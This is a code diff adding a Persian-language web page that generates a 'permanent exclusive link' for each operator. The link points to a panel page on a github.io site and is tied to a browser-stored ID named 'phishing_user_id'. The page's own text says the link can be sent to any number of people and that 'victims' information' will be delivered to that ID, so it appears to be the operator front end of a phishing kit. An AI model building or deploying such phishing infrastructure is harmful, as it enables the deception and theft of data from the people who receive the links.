@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ساخت لینک اختصاصی</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Tahoma, sans-serif; }
+        body {
+            background: linear-gradient(135deg, #0b2b3f, #1a4b61);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            direction: rtl;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 24px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+            width: 100%;
+            max-width: 550px;
+            text-align: center;
+        }
+        .title { font-size: 24px; font-weight: bold; color: #1a2a3a; margin-bottom: 10px; }
+        .sub { font-size: 14px; color: #6c7a8a; margin-bottom: 25px; line-height: 2; }
+        .link-box {
+            background: #f0f4ff;
+            padding: 15px;
+            border-radius: 12px;
+            border: 2px dashed #1a7ae8;
+            word-break: break-all;
+            font-size: 14px;
+            color: #1a2a3a;
+            direction: ltr;
+            text-align: center;
+        }
+        .copy-btn {
+            margin-top: 15px;
+            padding: 10px 20px;
+            background: #1a7ae8;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .copy-btn:hover { background: #0f5bb5; }
+        .note {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #94a3b8;
+            border-top: 1px solid #e2e8f0;
+            padding-top: 16px;
+        }
+        .note span { color: #1a7ae8; font-weight: bold; }
+        .info-box {
+            background: #f8fafc;
+            padding: 15px;
+            border-radius: 12px;
+            margin-top: 20px;
+            text-align: right;
+            border-right: 4px solid #1a7ae8;
+        }
+        .info-box h3 {
+            color: #1a2a3a;
+            font-size: 16px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        .info-box ul {
+            list-style: none;
+            padding: 0;
+        }
+        .info-box ul li {
+            padding: 8px 0;
+            font-size: 14px;
+            color: #4a5a6a;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        .info-box ul li:last-child {
+            border-bottom: none;
+        }
+        .info-box ul li::before {
+            content: "✅ ";
+            color: #16a34a;
+            font-weight: bold;
+        }
+        .user-id {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #6c7a8a;
+            background: #f8fafc;
+            padding: 8px;
+            border-radius: 8px;
+            direction: ltr;
+        }
+        .permanent-badge {
+            display: inline-block;
+            background: #16a34a;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="title">🔗 لینک اختصاصی شما</div>
+        <div class="sub">
+            این لینک <strong>منحصربه‌فرد و دائمی</strong> فقط برای شما ساخته شده است.
+        </div>
+
+        <!-- لینک اختصاصی -->
+        <div class="link-box" id="uniqueLink">در حال ایجاد لینک...</div>
+
+        <button class="copy-btn" onclick="copyLink()">📋 کپی لینک</button>
+
+        <!-- شناسه کاربر -->
+        <div class="user-id">
+            🆔 شناسه شما: <span id="userIdDisplay">...</span>
+            <span class="permanent-badge">♾️ دائمی</span>
+        </div>
+
+        <!-- ============================================= -->
+        <!-- توضیحات کامل درباره لینک دائمی -->
+        <!-- ============================================= -->
+        <div class="info-box">
+            <h3>📌 درباره لینک اختصاصی شما</h3>
+            <ul>
+                <li>این لینک <strong>فقط مخصوص شما</strong> است و تا ابد مال شما خواهد بود.</li>
+                <li>با هر بار باز کردن سایت، <strong>همین لینک</strong> به شما نمایش داده می‌شود.</li>
+                <li>شناسه شما در مرورگر ذخیره می‌شود و تا زمانی که مرورگر خود را پاک نکنید، همین لینک را دارید.</li>
+                <li>می‌توانید این لینک را برای <strong>هر تعداد کاربر</strong> ارسال کنید.</li>
+                <li>اطلاعات قربانیان <strong>به همین شناسه</strong> ارسال خواهد شد.</li>
+                <li>هیچ کس دیگری نمی‌تواند از این لینک استفاده کند مگر شما.</li>
+                <li>اگر مرورگر خود را پاک کنید، لینک جدیدی برای شما ساخته می‌شود.</li>
+            </ul>
+        </div>
+
+        <div class="note">
+            🔒 اطلاعات شما محفوظ است · <span>سامانه اختصاصی</span>
+        </div>
+    </div>
+
+    <script>
+        // =============================================
+        // لینک اصلی سایت
+        // =============================================
+        const BASE_URL = 'https://8080602.github.io/8080/';
+
+        // =============================================
+        // تابع تولید UUID
+        // =============================================
+        function generateUUID() {
+            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+                const r = Math.random() * 16 | 0;
+                const v = c === 'x' ? r : (r & 0x3 | 0x8);
+                return v.toString(16);
+            });
+        }
+
+        // =============================================
+        // دریافت یا ساخت شناسه کاربر
+        // =============================================
+        function getUserId() {
+            let userId = localStorage.getItem('phishing_user_id');
+            if (!userId) {
+                userId = generateUUID();
+                localStorage.setItem('phishing_user_id', userId);
+            }
+            return userId;
+        }
+
+        const USER_ID = getUserId();
+        const UNIQUE_LINK = BASE_URL + 'panel.html?user_id=' + USER_ID;
+
+        // =============================================
+        // نمایش لینک و شناسه
+        // =============================================
+        document.getElementById('uniqueLink').textContent = UNIQUE_LINK;
+        document.getElementById('userIdDisplay').textContent = USER_ID;
+
+        // =============================================
+        // کپی لینک
+        // =============================================
+        function copyLink() {
+            navigator.clipboard.writeText(UNIQUE_LINK).then(() => {
+                alert('✅ لینک کپی شد!');
+            }).catch(() => {
+                alert('❌ خطا در کپی');
+            });
+        }
+
+        console.log('🆔 شناسه کاربر:', USER_ID);
+        console.log('🔗 لینک اختصاصی:', UNIQUE_LINK);
+    </script>
+</body>
+</html>
